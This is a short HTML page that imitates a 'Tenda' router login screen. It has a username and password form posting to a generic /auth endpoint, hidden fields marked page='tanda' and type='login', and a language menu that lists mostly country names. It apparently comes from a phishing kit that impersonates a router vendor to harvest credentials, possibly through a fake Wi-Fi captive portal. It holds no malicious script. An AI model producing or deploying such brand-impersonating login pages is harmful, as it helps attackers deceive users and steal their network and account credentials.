<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body {font-family:Arial;text-align:center;background:#f9f9f9;margin:0}
  .box {display:inline-block;margin-top:50px;padding:20px;background:#fff;border-radius:6px;box-shadow:0 0 5px #aaa}
  select,input,button {width:100%;padding:8px;margin:8px 0;border:1px solid #ccc;border-radius:4px}
  button {background:#f60;color:#fff;border:none;cursor:pointer}
  a {font-size:12px;color:#666;text-decoration:none}
</style>
</head>
<body>
  <div class="box">
    <h2 style="color:#f60;margin:0 0 10px">Tenda</h2>
    <select>
      <option>English</option>
      <option>Hindi</option>
      <option>Malaysia</option>
      <option>Philippines</option>
      <option>Thailand</option>
      <option>Vietnam</option>
      <option>Singapore</option>
      <option>Hong Kong</option>
    </select>
    <form method="post" action="/auth">
    <input type="text" placeholder="Login Username" name="user">
    <input type="password" placeholder="Login Password" name="pass">

    <input type="hidden" name="page" value="tanda">
    <input type="hidden" name="type" value="login">
    <button type="submit">Login</button>
    </form>
    <div><a href="#">Forgot your password?</a></div>
  </div>
</body>
</html>
